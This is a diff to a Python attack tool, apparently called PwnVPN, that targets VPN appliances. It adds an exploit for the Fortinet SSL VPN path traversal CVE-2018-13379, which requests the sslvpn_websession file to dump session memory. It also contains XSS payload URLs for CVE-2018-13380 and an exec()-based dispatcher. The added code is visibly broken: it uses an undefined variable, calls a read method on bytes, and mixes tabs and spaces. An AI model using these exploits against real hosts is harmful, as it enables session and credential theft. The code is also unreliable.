@@ -26,10 +26,10 @@ if sys.platform == 'win32':
 
 
 banner = '''%s
- .  ..__ .  . __..     ..
- \  /[__)|\ |(__ |_  _ ||
-  \/ |   | \|.__)[ )(/,||
-                          V_1.0
+ .__          .  ..__ .  .
+ [__).    ,._ \  /[__)|\ |
+ |    \/\/ [ ) \/ |   | \|
+                           V_1.0
 
 %s''' % (blue, white)
 
@@ -62,7 +62,18 @@ if not len(host) and lst == False:
     print('No host to pwn.')
     quit()
 
+    
+    
+def printable_char(s):
+	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
 
+def printable(b):
+    if printable_char(b):
+        return byte
+    else:
+        return '.'
+    
+    
 
 def cve_2019_1579(host, port):
     sign = '<msg>Invalid parameters</msg>'
@@ -118,6 +129,7 @@ def cve_2019_1579(host, port):
         print(r + crlf)
         
         
+        
 def cve_2018_13380(host, port):
     url1 = 'https://%s%s/remote/error?errmsg=ABABAB--\%3E\%3Cscript\%3Ealert(1)\%3C/script\%3E' % (host, port)
     url2 = 'https://%s%s/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29' % (host, port)
@@ -127,6 +139,38 @@ def cve_2018_13380(host, port):
     print(' - %s' % red + url1)
     print(' - %s' % red + url2)
     print(' - %s' % red + url3)
+    
+    
+def cve_2018_13379(host, port):
+    url = 'https://%s%s/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession' % (host, port)
+    r = requests.get(url, verify=False, stream=True, timeout=3)
+    img = r.raw.read()
+    
+    if "var fgt_lang =" in str(img) and r.status_code == 200:
+        memory_addr = 0
+        rb = b''
+        _str = ''        
+    	while True:
+       		chunk = img.read(8192)
+        	if chunk:
+         		for b in chunk:
+                    rb += b     			
+        	else:
+          		break
+                
+        print('Dumped the memory buffer of %s:' % host)               
+        for byte in rb:
+            _str += printable(byte)
+            if memory_addr%61 == 60:
+                if _str != '.............................................................':
+                    print(_str)
+                _str = ''
+             
+            memory_addr += 1
+         
+    else:
+        print('The host %s is not vulnerable to CVE-2018-13379' % host)
+        
 
 
 def scan(host):
@@ -160,7 +204,7 @@ if not cve.upper() in cvelist:
     print('No 0day exploit found for %s' % cve)
     quit()
 else:
-    exec('%s(host, port, secs)' % cve.lower().replace('-', '_'))
+    exec('%s(host, port)' % cve.lower().replace('-', '_'))
 
 print('')
     
